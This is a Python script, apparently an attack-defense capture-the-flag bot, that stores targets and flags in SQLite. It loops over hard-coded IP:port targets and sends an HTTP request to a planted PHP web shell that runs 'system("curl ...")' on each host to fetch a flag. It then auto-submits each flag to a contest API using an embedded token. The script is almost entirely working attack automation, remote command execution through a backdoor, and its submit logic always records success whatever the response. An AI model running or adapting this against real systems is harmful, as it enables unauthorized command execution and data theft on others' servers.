
import requests
import time
import datetime


from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column,Integer,String,DateTime,event
from sqlalchemy.orm import sessionmaker
 
# 数据库连接字符串
#DB_CONNECT_STRING = 'sqlite:///:memory:'
DB_CONNECT_STRING = 'sqlite:///database.db'
 
# 创建数据库引擎,echo为True,会打印所有的sql语句
#engine = create_engine ( DB_CONNECT_STRING , echo = True )

engine = create_engine ( DB_CONNECT_STRING  )
Base = declarative_base(engine)



class Target(Base):
    __tablename__ = 'target'
    
    #uuid = Column(String(36), primary_key=True, unique=True, nullable=False, default=lambda: str(uuid4()), comment='uuid')
    id = Column(Integer, primary_key=True, autoincrement=True, comment='id')
    ip = Column(String(46), nullable=False, comment='ip地址')
    group = Column(String(48), default="default",nullable=False, comment='分组')
    status = Column(String(4), default="down",nullable=False, comment='状态')
    flag_number = Column(Integer,default=0,comment="flag数")
    create_time = Column(DateTime, default=datetime.datetime.now, comment='创建时间')
    alive_time = Column(DateTime, comment='最后在线时间')
    
    ssh_port = Column(Integer,comment='ssh_port')
    ssh_user_name = Column(String,comment='ssh_user_name')
    ssh_passwd = Column(String,comment='ssh_passwd')
    http_port = Column(Integer,comment='http_port')
    bad_flag =  Column(String,comment='bad_flag')
    
    

class Flag(Base):
    __tablename__ = 'flag'

    #uuid = Column(String(36), primary_key=True, unique=True, nullable=False, default=lambda: str(uuid4()), comment='uuid')
    id = Column(Integer, primary_key=True, autoincrement=True, comment='flag_id')
    flag = Column(String, nullable=False, unique=True, comment='flag')
    ip = Column(String(46), nullable=False, comment='ip地址')
    port = Column(Integer,comment='port')
    flag_status = Column(String(8), default="未发送",nullable=False, comment='状态')#未发送，已发送，发送失败
    create_time = Column(DateTime, default=datetime.datetime.now, comment='创建时间')
    send_time = Column(DateTime, comment='send_time')

    def __repr__(self):
        return str(self.ip+"|"+self.flag)
    def to_json(self):
        dict = self.__dict__
        if "_sa_instance_state" in dict:
            del dict["_sa_instance_state"]
        if "create_time" in dict:
            dict["create_time"] = dict["create_time"].strftime("%Y-%m-%d %H:%M:%S")
        return dict

    #初始化数据
@event.listens_for(Flag.__table__, 'after_create')
def create_Flag(target, connection, **kw):
    pass
    
    
'''
    
#初始化数据
@event.listens_for(Target.__table__, 'after_create')
def create_Target(target, connection, **kw):

    dict_list =[]
    for i in range(3):
        dict_list.append({'ip': "192.168.1."+str(i)})
    connection.execute(target.insert(), *dict_list)
'''

# 1. 创建表（如果表已经存在，则不会创建）
Base.metadata.create_all(engine)

Session = sessionmaker(bind=engine)
session =Session()



ddd ={
"183.129.189.62:62399",
"183.129.189.62:62397",
"183.129.189.62:62395",
"183.129.189.62:62393",
"183.129.189.62:62391",
"183.129.189.62:62389",
"183.129.189.62:62387",
"183.129.189.62:62385",
"183.129.189.62:62383",
"183.129.189.62:62381",
"183.129.189.62:62379"
}

for i in ddd:
    i = i.strip()
    ii = i.split(":")
    if len(ii)==2:
        target = session.query(Target).filter(Target.ip==ii[0]).filter(Target.ip==ii[1]).first()
        if target ==None:
            session.add(Target(ip=ii[0],http_port=int(ii[1])))
        
session.commit()
        

while True:

    targets = session.query(Target).all()
    for target in targets:
        try:
            url = "http://"+target.ip+":"+str(target.http_port)+"/public/admin/images/sub.php?a=system('curl 10.120.115.10/index.php?token=2674_USR-20220723-LINUx');"
            #print(url)
            res = requests.get(url, timeout=5)
            status_code =res.status_code
            flag =res.text
            if status_code !=200:
                print(status_code,flag)
                target.bad_flag= "http_request_status_code"+str(status_code)+flag
                continue
            
            
            if len(flag) != 32:
                print(target.ip+":"+str(target.http_port),"error",len(flag))
                target.bad_flag= "http_request_flag_len"+str(len(flag) )+flag
                continue
                
            flag_res = session.query(Flag).filter(Flag.flag==flag).filter(Flag.ip==target.ip).filter(Flag.port==target.http_port).first()
            if flag_res ==None:
                flag_dict = {"flag":flag,"ip":target.ip,"port":target.http_port,"flag_status":"未发送"}
                url ="https://train.linkedbyx.com/match-open-api/api/v1/player/awd/auto-submit?exerciseId=2674&token=USR-20220723-LINUx&flag="+flag
                #print(url)
                res = requests.get(url)
                if res.status_code!=200:
                    flag_dict["flag_status"]= "失败"
                #if "解题成功" not in res.text:
                #    flag_dict["flag_status"]= "失败"
                flag_dict["flag_status"]= "成功"
                flag_dict["send_time"]= datetime.datetime.now()
                session.add(Flag(**flag_dict))
                
                target.flag_number +=1
                target.alive_time = flag_dict["send_time"]
                target.status = "up"
                
                
                
                print("new flag ",flag,target.ip+":"+str(target.http_port),res.text)
            else:
                print("old flag ",flag)
            
        except Exception as e:
            target.status = "down"
            print(target.ip+":"+str(target.http_port),"error",e)
            
        session.commit()
        time.sleep(5)
        
        

        
    
    
    
    
    
    
        
    
    
    
    
    
    